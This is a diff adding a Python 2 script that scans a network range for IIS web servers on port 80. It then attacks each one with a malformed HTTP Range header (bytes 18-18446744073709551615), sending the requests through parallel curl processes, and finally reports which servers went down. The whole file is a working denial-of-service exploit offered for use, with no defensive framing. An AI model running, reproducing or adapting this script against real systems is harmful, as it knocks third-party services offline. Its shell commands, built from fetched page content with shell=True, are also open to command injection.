@@ -1,0 +1,113 @@
+#!/usr/bin/python
+
+
+
+
+import sys,os,socket,subprocess
+
+nt=sys.argv[1]
+if len(sys.argv)!=3:
+	print 'Enter %ProgramName% NetworkRange Time-Mili-Sec'
+	exit(0)
+opp=[]
+oct=nt.rsplit('.')
+for i in range(1,255):
+	ipp=oct[0]+'.'+oct[1]+'.'+oct[2]+'.'+str(i)
+	print ipp
+	u=socket.socket()
+	u.settimeout(float(sys.argv[2]))
+	rs=u.connect_ex((oct[0]+'.'+oct[1]+'.'+oct[2]+'.'+str(i),80))
+	if rs==0:
+		opp.append(ipp)
+		print '[+] '+ipp + 'port 80 is Open.'
+	u.close()
+if len(opp)==0:
+	print '\n              Host\'s Not  Find '
+	exit(0)
+print '*******************Opened Port 80 Address******************' 
+for i in opp:
+	print i
+print '***********************************************************'
+print 'GET Header Info ...'
+vuln=[]
+for i in opp:
+	#o=open(i,'w')
+	os.popen('curl -m 5 -D '+i+' '+ i )
+	print 'Check IIS is True or Not ...'
+	o=open(i,'r')
+	oo=str(o.readlines())
+	if 'IIS' in oo:
+		#global vuln
+		print '[+] ' +i +' Server Is IIS'
+		vuln.append(i)
+if len(vuln)==0:
+	print '\n                  No IIS Host Find'
+	exit(0) 
+print '\n\nChecking Ended.'
+print '\nThis Servers is IIS:\n********************************************************************'
+for i in vuln:
+	print '[+] %s' % i
+print '********************************************************************\n'
+
+#----------------------Get Images in Web Sites------------------------------
+def get_img(addr=''):
+	pic=''
+	if addr=='':
+		return 'no'
+	w=os.popen('curl -m 5 %s'% addr)
+	ww=w.readlines()
+	for i in ww:
+		if 'img src="' in i:
+			ii=i.rsplit('img src="')[1]
+			for i in ii:
+				if i !='"':
+					pic=pic+i
+				if i=='"':
+					print 'picture Address is http://'+addr+'/%s'% pic
+					return addr+'/'+pic
+	return 'no'
+
+#_____________________________________________________________________________Check Again , Which IIS Server\'s is UP :)
+def ch_ag():
+	down=[]
+	global vuln
+	for i in vuln:
+		d=socket.socket()
+		d.settimeout(1)
+		ch=d.connect_ex((i,80))
+		if ch==0:
+			print '[-]%s This server is Up ! '% i
+		else:
+			down.append(i)
+			print '[+]%s Yah , This server is Down :) '% i
+	print '*************************************\n*************************************\n*************************************\nThis server\'s is Down:\n'
+	for i in down:
+		print '[+]'+i
+	print '\n                                        Have Good Time.'
+#-----------------------------------------------------------------------------Last Action ---- Down Here Servers ;) ------------
+def fair():
+	global vuln
+	for i in vuln:
+		print '\nStart Attack on %s ....' % i
+		pi=get_img(i)
+		if pi=='no':
+			print '[-]This Host Doesnt have any Picture in his Page !'
+			continue
+		for ii in range(6):
+			print '############SUB Process##########'
+			subprocess.Popen('curl -m 5 --silent --range 18-18446744073709551615 '+pi,shell=True)
+	print '\n _________________________________Check Again for which server is up or down._______________________________'
+	ch_ag()
+
+#____________________________________________________________________________________________show action yes/no for asking user to attack or not 
+print 'Vuln Server sum is:%s'% len(vuln)
+while True:
+	y=raw_input('Are You went to Attack this Servers ?(Yes/No)')
+	if str(y)=='Yes' or y=='yes' or y=='Y' or y=='y':
+		fair()
+		break
+	if y=='NO' or y=='no' or y=='N' or y=='n':
+		break
+
+print 'IIS Server\'s sum is %s' % len(vuln)
+
